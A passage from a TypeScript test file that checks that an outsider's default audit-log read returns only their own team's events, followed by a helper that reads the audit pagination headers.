      // ...and their own default read is confined to their own team.
      const outsiderOwn = await route.GET(readRequest());
      const outsiderBody = await outsiderOwn.json() as AuditLogBody;
      expect(outsiderOwn.status).toBe(200);
      expect(outsiderBody.scope?.teamIds).toEqual([outsider.context.teams[0].id]);
      expect(outsiderBody.events?.every((entry) => entry.teamId === outsider.context.teams[0].id)).toBe(true);
    });
  });
});

function auditPaginationHeaders(response: Response) {
  return {
    total: response.headers.get("x-sena-audit-total"),
    returned: response.headers.get("x-sena-audit-returned"),
    nextOffset: response.headers.get("x-sena-audit-next-offset")
  };
}
